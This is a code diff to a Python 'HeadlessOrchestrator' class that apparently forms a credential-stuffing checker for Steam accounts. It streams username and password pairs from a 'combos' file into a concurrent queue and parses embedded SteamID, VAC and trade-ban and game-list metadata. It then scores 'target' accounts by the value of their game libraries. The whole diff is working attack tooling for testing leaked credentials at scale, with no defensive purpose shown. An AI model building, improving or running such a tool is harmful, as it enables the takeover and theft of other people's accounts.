@@ -228,21 +228,34 @@ class HeadlessOrchestrator:
         semaphore = asyncio.Semaphore(self.concurrency)
 
         async def _producer():
-            """Streams accounts from file using intelligent generator."""
+            """Streams accounts from file using intelligent generator with metadata extraction."""
             line_idx = 0
-            for user, pwd in stream_credential_tuples(self.combo_path):
-                if not self._is_running:
-                    break
-                line_idx += 1
-                if self.skip_to_index > 0 and line_idx <= self.skip_to_index:
-                    continue
-
-                await queue.put({
-                    "index": line_idx,
-                    "user": user,
-                    "pass": pwd,
-                    "retries": 0
-                })
+            from nexus.core.validator import parse_line_metadata
+            with open(self.combo_path, "r", encoding="utf-8", errors="ignore") as _f:
+                for raw_line in _f:
+                    if not self._is_running:
+                        break
+                    raw_line_stripped = raw_line.replace("\ufeff", "").replace("\x00", "").strip()
+                    if not raw_line_stripped or raw_line_stripped.startswith(("#", "//", "/*", "!", "--")):
+                        continue
+                    from nexus.core.validator import parse_credential_line
+                    # Extract credentials from the raw line
+                    first_segment = raw_line_stripped.split(" | ")[0].strip() if " | " in raw_line_stripped else raw_line_stripped
+                    user, pwd = parse_credential_line(first_segment)
+                    if not user or not pwd:
+                        continue
+                    line_idx += 1
+                    if self.skip_to_index > 0 and line_idx <= self.skip_to_index:
+                        continue
+                    # Parse embedded metadata (SteamID, Games, VAC) from this line
+                    line_meta = parse_line_metadata(raw_line_stripped)
+                    await queue.put({
+                        "index": line_idx,
+                        "user": user,
+                        "pass": pwd,
+                        "retries": 0,
+                        "meta": line_meta,
+                    })
             self.total_lines = line_idx
 
         producer_task = asyncio.create_task(_producer())
@@ -410,6 +423,46 @@ class HeadlessOrchestrator:
                 task_idx = task_data.get("index", 0)
                 if task_idx > self.max_processed_index:
                     self.max_processed_index = task_idx
+
+                # ── Metadata seed from combos.txt ──────────────────────────────────
+                # When the live library fetch returns 0 or no-name games, fall back to
+                # the pre-parsed game list embedded in the source combo line.
+                line_meta = task_data.get("meta", {})
+                if line_meta:
+                    # Seed SteamID if missing
+                    if not result.get("steamid") and line_meta.get("steamid"):
+                        result["steamid"] = line_meta["steamid"]
+                    # Seed VAC/trade ban status if not already set
+                    if not result.get("vac_banned") and line_meta.get("vac_banned"):
+                        result["vac_banned"] = line_meta["vac_banned"]
+                    if not result.get("trade_banned") and line_meta.get("trade_banned"):
+                        result["trade_banned"] = line_meta["trade_banned"]
+                    # Seed game list when live API returned nothing meaningful
+                    prefetched = line_meta.get("prefetched_games", [])
+                    if prefetched:
+                        live_games = result.get("games", [])
+                        live_named = [
+                            g for g in live_games
+                            if g.get("name") and not g["name"].startswith("AppID ")
+                        ]
+                        if len(live_named) < len(prefetched):
+                            from nexus.core.library import is_item_free
+                            merged = {g["name"]: g for g in live_named}
+                            for gn in prefetched:
+                                if gn not in merged:
+                                    is_f = is_item_free(0, gn)
+                                    merged[gn] = {
+                                        "appid": "",
+                                        "name": gn,
+                                        "hours": "0",
+                                        "is_free": is_f,
+                                        "banner_url": ""
+                                    }
+                            all_games = sorted(merged.values(), key=lambda g: (1 if g.get("is_free") else 0, g.get("name", "")))
+                            result["games"] = all_games
+                            result["total_games"] = len(all_games)
+                            result["paid_games"] = sum(1 for g in all_games if not g.get("is_free"))
+                # ──────────────────────────────────────────────────────────────────
 
                 is_target, matched_targets = evaluate_target_account(result)
                 if is_target:
